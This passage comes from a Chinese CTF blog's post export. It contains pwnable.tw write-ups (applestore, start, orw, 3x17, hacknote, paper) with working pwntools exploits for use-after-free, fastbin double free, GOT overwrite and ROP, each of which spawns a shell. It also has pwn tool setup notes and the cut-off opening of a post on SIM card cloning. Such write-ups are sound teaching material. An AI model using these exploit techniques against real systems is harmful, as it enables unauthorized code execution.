= ELF('applestore')\nmylibc = ELF('../libc_32.so.6')\nmyps = remote('chall.pwnable.tw',10104)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n# 4 reference\n\n[C语言alarm()函数：设置信号传送闹钟](http://c.biancheng.net/cpp/html/334.html)\n\n[asprintf](https://blog.csdn.net/yuan08shandong/article/details/50580834)\n","tags":["heap"],"categories":["CTF"]},{"title":"pwnable.tw之start-ORW-3x17","url":"/2020/03/04/startORW317/","content":"\n这里把pwnable.tw上前面的几个题放在一起写篇博客，分别是：\n\n- start\n- orw\n- 3x17\n\n# 1 start\n\n## 1.1 题目\n\nhttps://pwnable.tw/challenge/#1\n\n## 1.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](start1.png)\n\n运行起来试试：\n\n![](start2.png)\n\nIDA查看二进制文件start：\n\n![](start3.png)\n\n![](start4.png)\n\n发现除了_start和_exit没有熟悉的main函数，使用IDA查看伪代码也不是一个正常的函数，原因在于这是一个纯汇编代码。\n\n因此我们需要看懂这段汇编都做了些什么：\n\n1    压了_exit函数的地址\n\n2    清eax,ebx,ecx,edx\n\n3    压字符串，20个字节\n\n4    分别给eax,ebx,ecx,edx赋值(4,1,esp,20),然后int 80h系统调用\n\n5    清ebx,给eax,edx赋值（3，60），然后int 80h系统调用\n\n6    esp加20个字节收回栈空间\n\n7    根据栈上的返回地址（_exit）返回\n\n可以看到有两次系统调用（eax是系统调用号，然后ebx，ecx，edx，esx，edi分别放置系统调用的参数）。查表可知4对应的系统调用是write，3对应的是read。\n\n因此以上4和5可以翻译成：\n\n```c\nwrite(1,esp,20); // 从栈上读20个字节到标准输出（读内存）\nread(0,esp,60);  // 从标准输入写60个字节到栈上（写内存）\n```\n\n很明显是个栈溢出，read的60个字节会覆盖到返回地址exit。\n\n![](start5.png)\n\n## 1.3 利用\n\nexit被覆盖后，就控制了eip，此时应该让eip指向哪儿才能get shell呢？当然是指向我们构造的一段shellcode，shellcode应该放哪儿呢？如果放在栈上，但此时我们并不知道栈的地址，那么能不能泄露栈地址呢？再看一下汇编代码：\n\n![](start6.png)\n\n第一次执行完retn之后，esp指向下图位置：\n\n![](start7.png)\n\n如果此时从08048070处开始执行，就可以将old esp的值打印出来，old esp = esp+4。并且可以继续从此esp指向的位置写0x3C字节，如下图所示，esp往上是第二次的输入，我们可以好好构造这次输入，让下次执行retn时，再一次劫持eip（即ret addr），将ret addr覆盖为shellcode addr即可。\n\n![](start8.png)\n\n现在重新理一下，oldesp是write系统调用时泄露出来的，因此shellcode addr是old esp+0x14。那么现在需要找一段合适的shellcode来get shell。\n\n在http://shell-storm.org/shellcode/找到一段长度合适的shellcode如下：\n\n![](start9.png)\n\n![](start10.png)\n\nexp如下：\n\n![](start11.png)\n\n执行结果如下：\n\n![](start12.png)\n\n![](start13.png)\n\n## 1.4 记录\n\n### 1.4.1 pwntools的使用\n\nhttps://pwntools.readthedocs.io/en/stable/about.html\n\nhttp://brieflyx.me/2015/python-module/pwntools-intro/\n\npwntools的cyclic：\n\nhttps://www.cnblogs.com/liuyimin/p/7379985.html\n\n### 1.4.2 gdb-peda的使用\n\n[https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/](https://introspelliam.github.io/2017/08/03/pwn/gdb的调试与使用/)\n\npwntools + gdb：\n\nhttp://docs.pwntools.com/en/stable/gdb.html?highlight=gdb#module-pwnlib.gdb\n\n### 1.4.3 shellcode database\n\nhttp://shell-storm.org/shellcode/\n\n# 2 orw\n\n## 2.1 题目\n\nhttps://pwnable.tw/challenge/#2\n\n## 2.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](orw1.png)\n\n运行起来试试：\n\n![](/orw2.png)\n\nIDA查看二进制文件orw：\n\n![](orw3.png)\n\n伪代码如下：\n\n![](orw4.png)\n\n【orw_seccomp()是一个设置函数，这里的作用是设置只能使用open，read，write三个系统调用。具体原理参考2.4.2中。】\n\nread从标准输入读取数据放到shellcode地址处，然后转到shellcode处去执行代码。\n\nshellcode地址如下：\n\n![](orw5.png)\n\nview, open subviews, segments查看bss段属性：\n\n![](orw6.png)\n\n【这里显示不可执行，但checksec中RWX属性为has RWX segments且实际shellcode放到bss段中后可执行，这里目前还不知道是为什么？？？】\n\n## 2.3 利用\n\n题目只允许使用open，read，write三个系统调用函数，因此通过这三个函数实现打开/home/orw/flag文件，将其读到bss段或者栈中，然后再将bss或栈中的数据写到标准输出（即屏幕上）打印。\n\n![](orw7.png)\n![](orw8.png)\n\npayload对应的汇编代码：\n\n![](orw9.png)\n\n执行得到flag：\n\n![](orw10.png)\n![](orw11.png)\n\n## 2.4 记录\n\n### 2.4.1 64位ubuntu安装32位库\n\nubuntu 64位版本，安装支持32位程序的二进制库。\n\nsudo dpkg --add-architecture i386\n\nsudo apt-get update\n\nsudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386\n\n### 2.4.2 seccomp和prctl\n\n[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)\n\nhttps://www.jianshu.com/p/62ede45cfb2e\n\nhttps://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\n\n### 2.4.3 pwnlib.shellcraft.i386\n\n这次题目中只用到了两个重要的函数。\n\n第一个是将字符串push到栈中，此时esp指向的就是这段字符串。\n\n`pwnlib.shellcraft.i386.pushstr(string, append_null=True)`\n\n```python\n>>>print shellcraft.i386.pushstr('aaaa').rstrip()\n  /* push 'aaaa\\x00' */\n  push 1\n  dec byte ptr [esp]\n  push 0x61616161\n```\n\n第二个是系统调用，syscall是要调用的函数（eax存放系统调用号），后面紧接着的是各个参数（ebx，ecx，edx等）（参数可以是某个寄存器，如’esp’）。\n\n`pwnlib.shellcraft.i386.linux.syscall(syscall=None, arg0=None, arg1=None, arg2=None, arg3=None, arg4=None, arg5=None)`\n\n```python\n>>> print pwnlib.shellcraft.i386.linux.syscall('SYS_execve', 1, 'esp', 2, 0).rstrip()\n    /* call execve(1, 'esp', 2, 0) */\n    push SYS_execve /* 0xb */\n    pop eax\n    push 1\n    pop ebx\n    mov ecx, esp\n    push 2\n    pop edx\n    xor esi, esi\n    int 0x80\n```\n\n参考别人的writeup，发现简洁写法（因为提前用context设置了目标环境）：\n\n![](orw12.png)\n\n# 3 3x17\n\n## 3.1 题目\n\nhttps://pwnable.tw/challenge/#32\n\n## 3.2 分析\n\n查看文件类型和开启的保护机制：\n\n![](3171.png)\n\n是去了符号表的，且静态链接。因此IDA的F5基本上没用了，只能纯看汇编。先执行看看：\n\n![](3172.png)\n\n属于addr和data，这里猜测会是将data写到addr上。 后续查看汇编代码，确实是这样。\n\nIDA打开二进制文件，只有start函数：\n\n![](3173.png)\n\n不知道以上各地址和寄存器的值代表什么内容，因此自己写了个printf(“hello world!\\n”)的小程序，使用IDA打开，找到start对应的汇编，如下：\n\n![](/3174.png)\n\n因此3x17的start可解析为下图：\n\n![](3175.png)\n\n64位汇编参数传递规则如下：\n\n![](3176.png)\n\n因此\n\n__libc_start_main(mian[sub_401B6D], argc, ubp_av, init [loc_4028D0], fini[sub_402960], rtld_fini)\n\nmain函数代码如下：\n\n![](3177.png)\n\nsub_40EE70具体做了什么，看汇编代码太复杂，因此通过gdb调试看结果，使用gdb在401BED处下断点。\n\n![](3178.png)\n\n断点处信息如下：\n\n![](3179.png)\n\n执行完该函数之后，返回值会存放在RAX中。刚刚输入的是12345，返回值为0x3039，即12345的十六进制，因此该函数就是将输入的十进制数转换为一个十六进制地址。\n\n![](31710.png)\n\ninit是执行main函数之前会执行的，而fini是main执行完后执行的函数。\n\n因此考虑用任意地址写去覆盖fini的执行流程。如下是fini的汇编代码，在4B40F0处分别调用两个函数，且调用顺序是先fini_array[1]后fini_array[0]。那么只要将数组中的地址覆盖为我们想要的地址，就可以控制程序去执行了。\n\n![](31711.png)\n\n![](31712.png)\n\n## 3.3 利用\n\n获得以上信息之后，我们需要考虑，应当让fini_array的两个函数地址分别被覆盖为什么，才能达到利用的目的。利用就是get shell。在程序中使用strings搜索“/bin/sh”无果，因此一步完成get shell是不可能的，需要寻找其他方法。\n\nmain函数中可以实现任意地址写，如果将fini_array[1]的地址指向main，那么似乎就可以继续任意地址写。查看main函数，发现byte_4B9330为1时才能进入任意地址写操作，而我们第二次进入该函数时byte_4B9330已经为2了。怎么办呢？但是看看前面的int8，这是一个8位无符号整形，因此不用加多久，就整数溢出又变成1了。\n\n![](31713.png)\n\n那么怎么让main一直被调用呢？剩下的fini_array[0]就派上用场了。\n\n![](31714.png)\n![](31715.png)\n\n把fini_array[1]和fini_array[0]分别覆盖为main和调用array的fini函数，就可以实现如下循环。\n\n![](31716.png)\n\n这样就可以不限次数的任意地址写了。但是往哪里写，写什么内容呢？因为没有可写可执行段，因此直接把shellcode布置到内存空间中跳转执行是不可能的。那么就只能考虑ROP了，但不知道栈的位置，也没法去布置栈空间实现ROP。不过RIP是我们可以控制的，因此只要存在某一刻rsp会被泄露出来，那么只要在这一刻之前把对应地址空间布置好，那么就可以不断地ret然后把ROP链串起来啦。\n\n回到fini函数中，rbp原本的值被暂时存放在栈中，这里以rbp做临时寄存器，存放了fini_array的起始地址，此时rbp=0x4B40F0。\n\n![](31717.png)\n\n如果call指令能跳转到leave; ret; 这样的指令去，那么就可以控制rsp的地址了。如下是main函数中一条合适的指令：\n\n![](31718.png)\n\n```assembly\nrbp = 0x4B40F0\n\nleave:\nmov rsp,rbp          rsp = 0x4B40F0, rbp = 0x4B40F0\npop rbp                 rsp = 0x4B40F8, rbp = fini_array[0]\n\nret:\npop rip                  rsp = 0x4B4100, rip = fini_array[1]\n```\n\n这里必须让fini_array[1]为main，fini_array[0]为0x401C4B。这样rip被控制再去执行一次main函数，利用最后的ret，使rip从0x4B4100处执行，这里是我们提前布置好的空间。\n\n那么接下来的工作就是怎么布置0x4B4100以上的空间，通过ROP的方式获取shell。\n\n一条简单的获取shell的命令：\n\n![](31719.png)\n\n32位系统上通过int 80进行系统调用，64位系统上通过syscall指令实现。根据以上代码，需要控制rax为59（execve的系统调用号，0x3B），rdi为字符串“/bin/sh\\x00”的地址，rsi为0，rdx为0。因此rsp指向位置的ROP链应如此布置：\n\n```assembly\npop_rax\n0x3B\npop rdi\naddr_of_bin_sh\npop rsi\n0\npop rdx\n0\nsyscall\n```\n\n最后，字符串“/bin/sh\\x00”随便找一块可写的空间写上去就行。\n\n寻找gadget：\n\n![](31720.png)\n\n![](31721.png)\n\n![](31722.png)\n\n![](31723.png)\n\n![](31724.png)\n\n写exp：\n\n![](31725.png)\n\n执行获得flag：\n\n![](31726.png)\n\n## 3.4 记录\n\n### 3.4.1 64位汇编参数传递\n\nhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之hacknote","url":"/2020/03/01/hacknote/","content":"\n# 1 题目\n\n[题目链接](https://pwnable.tw/challenge/#5)\n\n![](hacknote-1.png)\n\n提供了一个二进制文件hacknote和一个库libc.so。\n\n# 2 分析\n\n首先分析一下这个题目的可执行程序。这是一个32bit的可执行程序，动态链接且去了符号表。该二进制程序符号表可读可写，开启了栈不可执行和canary保护，没有开启地址随机化。\n![](hacknote-2.png)\n执行以下试试。如下图，该程序提供了几个功能，添加/删除/打印笔记。我们用IDA看看这些功能的实现。\n![](hacknote-3.png)\n（1）add note功能\n![](hacknote-4.png)\nAdd操作只能执行5次。Sub_804862B函数如下，将a1+4这个地址处的指针取出，然后利用puts将该指针指向的内容进行打印。\n![](hacknote-5.png)\nChunk1和chunk2的关系如下图所示：\n![](hacknote-6.png)\n（2）delete note功能（这里存在漏洞点）\n![](hacknote-7.png)\n可以看到，delete函数将chunk2和chunk1释放掉后，并没有将指向各chunk的指针ptr[v1]置NULL，导致了悬空指针的产生。\n\n（3）print note功能\n![](hacknote-8.png)\n\n# 3 利用\n\n> 利用主要从两个方面去考虑（以第2节中chunk1和chunk2的图为例）：\n> 1、puts的内容就是chunk2中的内容，因此考虑将chunk2中的内容覆盖为我们想要的东西。如libc中某个函数的地址，这样我们就可以计算得到libc的基址，从而知道任意一个libc函数在动态执行时的地址。\n> 2、chunk1的的内容部分，前四个字节是一个函数指针，如果我们能控制这个chunk的前四个字节，就可以实现任意地址执行，劫持EIP。然而chunk1的内容并非我们能轻易改动的，因此需要结合glibc的堆管理机制中存在的漏洞，使chunk1的内容变得可控，且依然满足原来可执行的特性。从这里可以看出，我们需要两个不同的对象操作同一块内容，本质就是UAF。\n\n## 3.1 获取libc基址\n\n### 3.1.1 本地调试时libc的基址\n本地调试时，可以在gdb中方便地获取到libc的基址，为0xf7e07000。\n![](hacknote-9.png)\n### 3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址\n**Unsorted bin有一个特性，就是链表中第一个chunk的fd和bk均指向main_arena结构体中的top位置。因此只要我们泄露出这个地址，加上题目提供的libc，就可以轻松计算出libc在实际场景中的基址了。**\n\n首先add一个64字节的note，再add一个10字节的note，然后delete掉第一个note。此举的目的是使第一个note中大于fastbin的堆块不被top chunk给合并掉，从而该堆块可以进入unsorted bin。\n![](hacknote-10.png)\n再次申请64字节的空间，堆管理器会把unsorted bin中的chunk再次分配给我们，此时index 2和index 0指向同一块堆内存区域。此时输入的内容只要不覆盖到unsorted bin中那个chunk的bk位置，就可以在成功分配后，调用print打该内存区域，获得main_arena中top的地址（地址是不可显示字符，所以显示乱码）。\n![](hacknote-11.png)\n![](/hacknote-12.png)\n![](hacknote-13.png)\n### 3.1.3 远端的libc中top相对libc基址的偏移\n\nLibc库中的Malloc_trim函数中存在main_arena结构体，如下图位置：\n![](hacknote-14.png)\n查看main_arena在libc库中的偏移为0x001B0780。按照main_arena结构体与unsorted bin的关系（如下图），可知第一个被归档到unsorted bin的chunk，其fd与bk应当指向0x001B0780+0x30=0x001B07B0。\n![](hacknote-15.png)\n因此unsorted bin中返回的值，与libc基址的偏移为0x001B07B0。\n\n那么libc_base = addr(dongtai_top) – 0x001B07B0，因此只需要用3.1.2中的方法将top的地址泄露出来，就可以计算出libc的基址啦。\n\n## 3.2 劫持EIP\n>思路：申请note时会建立chunk1（8byte）和chunk2（跟chunk1不同的大小就行），若再申请一个note，此时又会建立chunk1`和chunk2`。将这两个note删除后，chunk1和chunk1`会被链到同一大小（8byte）的fastbin上，chunk2和chunk2`会被链到其他大小的fastbin上。如果此时再申请一个8byte的note，就会将chunk1`和chunk1分别作为puts函数堆和内容堆。这个时候，chunk1被index 0和index2同时锁定。我们通过index 2 更改chunk1中的内容，然后通过index 0 去执行被替换掉的函数指针。\n\n具体操作如下：\n\n先申请两个大小为30的note，然后删除掉这两个note\n![](hacknote-16.png)\n再add一个大小为8的note，此时会将fastbin上大小为8的chunk进行分配。如下图，从上往下，第一个chunk已经被写入555了。\n![](hacknote-17.png)\n此时print 2得到如下结果。print 0 会报段错误，eip被覆盖成了555（即最后申请大小为8的堆时输入的content）。说明我们可以通过这种方式控制eip指针。\n![](hacknote-18.png)\n![](hacknote-19.png)\n\nEXP如下：\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./hacknote')\nmylibc = ELF('./libc_32.so.6')\nio = remote('chall.pwnable.tw',10102)\n\ndef add_note(size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"size :\")\n    io.sendline(str(size))\n    io.recvuntil(\"Content :\")\n    io.sendline(content)\n\ndef del_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\ndef print_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\n\nadd_note(64,\"12\")\nadd_note(32,\"12\")\ndel_note(0)\nadd_note(64,\"45\")\nprint_note(2)\n\nlibc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0\nsys_addr = libc_addr + mylibc.symbols['system']\n\n# add_note(8,\"12\")\n# add_note(8,\"34\")\n# del_note(3)\n# del_note(4)\ndel_note(0)\ndel_note(1)\nadd_note(8,p32(sys_addr)+\";sh\\x00\")\nprint_note(0)\nio.interactive()\n\n```\n\n# 4 记录\n\n## unsorted bin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\n\n\n","tags":["heap","unsortedbin"],"categories":["CTF"]},{"title":"ctf堆入门 - paper","url":"/2020/02/23/paper/","content":"\n[题目文件链接](https://xuanxuanblingbling.github.io/assets/pwn/paper)\n\n# 1、寻找漏洞点\n\n拿到ELF后，先看看它的一些信息。\n- File查看文件格式\n- Checksec查看开启的安全编译选项\n- 运行一下看看都有哪些功能\n- 使用IDA看看伪代码，理解整个二进制程序的功并查找漏洞点。\n\n![](paper-1.png)\n\n64位程序，动态链接，没有去符号表，got表可写可读，开启栈不可执行和canary保护，没有做地址随机化。\n\n![](paper-2.png)\n\n程序提供两个功能，增加paper和删除paper，paper中可以存放指定大小的数据。\n\n![](paper-3.png)\n\nIDA查看程序实现，关注add_paper和delete_paper。\n\n![](paper-4.png)\n\nAdd paper中申请一块堆，然后存放数据。这个函数实现各项检查都做得很好，没发现漏洞点。\n\n![](paper-5.png)\n\nDelete paper中free掉指向堆的`link_list[index]`指针后，没有将该指针置NULL。导致一个悬空指针的产生《对几类危险的指针，见本文的记录——三类漏洞指针》。\n\n# 2、利用分析\n\n堆管理机制中，对于较小的堆块，采用fastbin的方式进行回收（本题中要求堆块小于0x80，这样free操作之后，该chunk会被链接到fastbin上）。本题中，申请的最大堆内存为1024Byte，所以要控制申请的堆大小不超过0x80。\n\n根据fastbin的单向链表及其他特性《见记录——fastbin attack》，我们需要通过double free在fastbin的链表中构造一个环（如下图）。然后申请一个与chunk1、chunk2相同大小的堆，此时会返回chunk1给线程使用，于是可以更改chunk1中的数据（如将“fd”位置处的值改为我们的目标地址）。下一次malloc时分配chunk2，再下一次分配时依然是chunk1，但此时main_arena已经指向目标地址处（如果目标地址合理）了。此时再malloc一次，就可以实现对该地址空间写任意值了。\n\n![](paper-6.png)\n\n这样接下来的目标就是，往哪里写才能getshell呢？\n\n要getshell就必须控制指针的执行流，使其执行我们构造的提权函数或者直接去执行该二进制文件中已有的提权函数。\n\n（1）寻找或构造提权函数（这里以ELF中自带提权函数为例）\n\n回到ELF文件，搜索“/bin/sh”或system函数，看是否存在这种后门，使利用更加简单。在string窗口中搜索“/bin/sh”，查看其引用gg，发现gg中会调用system(“/bin/sh”)。\n\n![](paper-7.png)\n\n![](paper-8.png)\n\n![](paper-9.png)\n\n至此，我们的提权函数就找到了！那么怎样才能让程序流乖乖地来执行我们的提权函数呢？\n\n（2）替换函数内容或替换函数指针（这里以替换函数指针为例）\n\t\n控制执行流的做法通常是将原本要执行的函数进行替换，替换函数指针或者替换掉函数内容。\n\n这里我们已经有了一个提权函数gg，且ELF并未开启地址随机化，那么首先想到的是控制某个函数指针指向gg。也就是说要把gg函数的地址0x00400943写到某个会被当做“函数指针”的地址0x12345678上去，这样当原本程序流从该0x12345678上取值并跳转执行时，就会执行gg函数了。\n\n![](paper-10.png)\n\n往哪里写这个gg函数地址呢？回到ELF文件，逆向查看伪源码，源码中并未定义有用的函数指针，但是栈上的返回地址可以作为考虑的一个选项。另外一种方法，就是去覆写got表了，具体做法是更改该got表的某个表项内地址为gg函数地址。这样当程序执行到该got表中函数（如printf、puts、gets等等）时，便会去执行我们的提权函数啦。\n\n那么最后，怎么获取到got表的地址以及该got条目的地址呢？由于本题的ELF未开启地址随机化，所以可直接通过IDA查看got表的起始地址以及各表项的具体地址。然而，对于开启随机化的ELF，就需要我们想办法去泄露got表地址了，这个方法在这篇文章中不予讨论。\n\n可以看到该ELF的got表条目如下，got表地址为0x00602000。\n\n![](paper-11.png)\n\n到这里利用思路基本明确了，就是将chunk1中fd的地址替换成got表中某一项（会执行到的函数）的值，然后将该项的值改成gg函数地址。\n\n那么这个got表中的地址需不需要满足什么条件呢？答案是必须的！main_arena把chunk从fastbin链表上卸下来的时候，会去检查该chunk中fd指向的另一chunk是否为合法chunk。合法chunk的特征是什么呢？就是目标chunk数据区之前的八个字节（64位下）必须是合法的size值，标志这个chunk的大小。Ps：其实只要这八个字节的低四字节满足就可以了。\n\n因此我们需要在上述got表中，寻找满足这种条件的地址。如下图，标记颜色的五个部分满足低四个字节为0x00000040或0x00000060，这可以是一个合法的size值。\n\n![](paper-12.png)\n\n但是选哪个作为目标地址呢，还需要结合got表项进行考虑。\n\n- 选0x602002处作为chunk的size部分\n- 选0x60201a处作为chunk的size部分\n- 选0x602032处作为chunk的size部分\n- 选0x60203a处作为chunk的size部分\n\n如果我们想覆写printf函数，即0x602040处的值，那么得使用0x602032处作为chunk的size部分。此时整个chunk的起始地址是0x60202a。可任意写的数据区从0x60203a开始。由于system函数在0x602038至0x60203f区间，因此0x60203a至0x60203f的值需要保持不变。需要将0x602040至0x602047的值改为gg函数地址。因此需要往0x60202a写入的内容为：\\x40\\x00\\x00\\x00\\x00\\x00+gg地址\n\n因为最终选择的chunk size（包含chunk头）为0x40，所以申请的堆内存大小必须是0x30。接下来可以写利用代码了。\n\n# 3、EXP\n\n```python\nfrom pwn import *\ncontext(os=\"linux\",arch=\"amd64\",log_level=\"debug\")\n\ne = ELF(\"./paper\")\nio = process(e.path)\n\ndef add_paper(index,length,content):\n    io.recv()\n    io.sendline(\"1\")\n    io.recv()\n    io.sendline(str(index))\n    io.recv()\n    io.sendline(str(length))\n    io.recv()\n    io.sendline(content)\n\ndef delete_paper(index):\n    io.recv()\n    io.sendline(\"2\")\n    io.recv()\n    io.sendline(str(index))\n    \nadd_paper(1,0x30,\"111\")\nadd_paper(2,0x30,\"222\")\n\ndelete_paper(1)\ndelete_paper(2)\ndelete_paper(1)\n\nadd_paper(3,0x30,p64(0x0060202a))\nadd_paper(4,0x30,\"444\")\nadd_paper(5,0x30,\"555\")\nadd_paper(6,0x30,\"\\x40\\x00\\x00\\x00\\x00\\x00\"+p64(e.symbols[\"gg\"]))\n\nio.recv()\nio.sendline(\"t\")\nio.interactive()\n\n```\n\n执行成功，getshell！\n\n![](paper-13.png)\n\n# 4、记录\n\n## 三类漏洞指针\n\n1、空指针：指向NULL的指针，若使用指针前未判断其是否为空，可导致程序崩溃。\n\n2、悬空指针：也称迷途指针，指向一段已释放的内存单元的指针，可导致UAF等漏洞。\n\n3、野指针：指向一段未初始化内存单元的指针。\n\n## fastbin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/\n\n\n## GOT表与PLT\n\nhttps://blog.csdn.net/qq_18661257/article/details/54694748\n\nhttps://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n## pwntools的使用\n\nhttps://www.cnblogs.com/Ox9A82/p/5728149.html\n\n\n\n# 5 新机搭建pwn环境\n\n由于这题必须在ubunut1804环境下利用，所以整个pwn的做题环境又需要重新搭一遍。为了以后再遇到这种情况时，可以迅速完成环境搭建，这里做一下记录。\n\n## 安装pwntools\n\n```shell\napt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n## 安装checksec\n\n```shell\ngit clone https://github.com/slimm609/checksec.sh.git\ncd checksec.sh\nsudo cp checksec /usr/bin/checksec\n```\n\n新版使用方法：\n\n```shell\nchecksec --file=filename\n```\n\n## 安装pwndbg\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\nsudo ./setup.sh\n```\n\n## 安装gef\n\nubuntu中下载gef.py不成功，因此跑去github直接下载源文件：\n\n[gef网址](https://github.com/hugsy/gef)\n\n```shell\n# 下载gef.py至/home/xxx用户根目录\n$ mv gef.py .gdbinit-gef.py\n$ echo \"source ~/.gdbinit-gef.py\" >> ~/.gdbinit\n```\n\n## 安装peda\n\n[peda网址](https://github.com/longld/peda)\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n## 安装ROPGadget\n\n```shell\nsudo pip install capstone\ngit clone https://github.com/JonathanSalwan/ROPgadget.git\ncd ROPgadget\nsudo python3 setup.py install\n```\n\n## 安装one_gadget\n\n```shell\n$ sudo apt -y install ruby\n$ sudo gem install one_gadget \n```\n\n## 安装LibcSearcher\n\n```shell\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\nsudo python3 setup.py develop\n```\n\n## 安装32位libc\n\n方便运行32位程序，有两种方法：\n\n（1）\n\n```shell\nsudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386\nsudo apt-get install libgtk2.0-0:i386\n```\n\n（2）\n\n```shell\n# 第一步，确认系统的架构\ndpkg --print-architecture  \n# 第二步，确认打开了多架构支持功能\npkg --print-foreign-architectures \n# 第三步，安装对应的32位库\nsudo apt-get dist-upgrade #这一步是更新所有的软件，如果你对新版本软件的需求不是那么迫切，可以不执行 \n#安装相关库  \nsudo apt-get install lib32z1 lib32ncurses5 #有的还需要32位stdc++库lib32stdc++6-4.8-dbg\n#安装gcc multilab  \nsudo apt-get install gcc-multilib g++-multilib  \n```\n\n","tags":["heap","fastbin"],"categories":["CTF"]},{"title":"SIM卡复制原理","url":"/2020/02/08/SIM/","content":"# SIM卡复制原理\n\n> GSM手机要想得到GSM系统的服务需要插入一张SIM卡。因为GSM系统是通过SIM卡来识别用户的，而不是基于手机来识别。\n>\n> 移动终端上必须装上sim卡才能使用，sim卡是整个**GSM系统**（全球移动通讯系统）中唯一确认用户身份的设备。\n\n## 常用缩写\n\nSIM，Subscriber Identification Module，客户识别模块（也称用户身份识别卡）。\n\nIMEI，国际移动设备识别码。由15位数字组成，每台手机对应一个IMEI，为全世界独一无二的。\n\nMEID，移动设备识别码。由14位十六进制字符组成。\n\nIMSI，国际移动用户识别码。通过IMSI可反查运营商、归属地、手机号码等信息。\n\n## sim卡的演进\n\n1991年，德国捷德公司开发了世界第一张SIM卡，大小是一个名片的大小。此类卡是**标准SIM卡**，也叫“原卡”。\n\n中国移动通信起步较晚，没赶上“原卡”时代，因此我们一开始接触到的是Mini SIM卡。再之后由于手机逐步小型化，2010年出现了Micro SIM卡，首先使用在苹果公司的产品上，如ipad、iphone4。2011年，苹果公司提出了更小的sim卡标准——Nano SIM卡。\n\n![](sim-4-kinds.png)\n\n以上的演进，说白了就是剪卡过程，并不是什么技术演进。\n\n但是Nano SIM卡还是占据较大的空间，在小型可穿戴设备上不实用，而且卡槽中放卡的方式不稳定。因此发展出了eSIM卡Embeded-SIM，直接嵌入到电路板上。\n\n但是eSIM仍然是一个硬件。现在还出现了依靠操作系统软件实现SIM卡功能的softSIM和vSIM，这样就完全告别实体SIM卡片了。\n\n伴随着网络变化，sim卡的变化：\n\n- SIM卡存在无法接入LTE/IMS网络的局限性\n- USIM可接入LTE/2G/3G网络，但不存储IMS网络相关的用户信息，因此接入VoLTE网络时，还需要通过终端导出IMS注册时所需要的用户码号信息。\n- ISIM卡是在USIM卡的基础上，增加了ISIM模块，专门用于存储IMS网络相关用户码号和归属地信息。可以通过读取ISIM模块中的信息直接接入VoLTE网络。\n\n## sim卡硬件特性\n\n> sim卡是一个装有微处理器的芯片卡。\n\n下面看一看实际的sim卡长什么样：\n\n![](sim-6-parts.png)\n\nsim卡通过这些铜制接口将卡内逻辑电路与移动终端连接起来。其中与移动终端连接的有如下六个触电：电源（Vcc），复位（RESET），时钟（CLK），接地端（GND），编程电压（VPP），数据I/O接口（Data）\n\nsim卡硬件内部包含如下五个模块：\n\n- 微处理器cpu，8位\n- 程序存储器ROM，3~8kbit\n- 工作存储器RAM，6~16kbit\n- 数据存储器EPROM，128~256kbit\n- 串行通信单元\n\n使用时，手机会向sim卡发送命令，sim卡根据标准规范执行后，给手机反馈执行结果。\n\n##　sim卡的功能\n\n1、存储数据：\n\n- 固定数据：这类数据在ME（Mobile Equipment）被出售之前由SIM卡中心写入，包括国际移动用户识别号（IMSI）、鉴权密钥（KI）等\n- 临时数据：指的是网络相关的的临时数据，如位置区域识别码（LAI）、移动用户暂时识别码（TMSI）、禁止接入的公共电话网代码等\n- 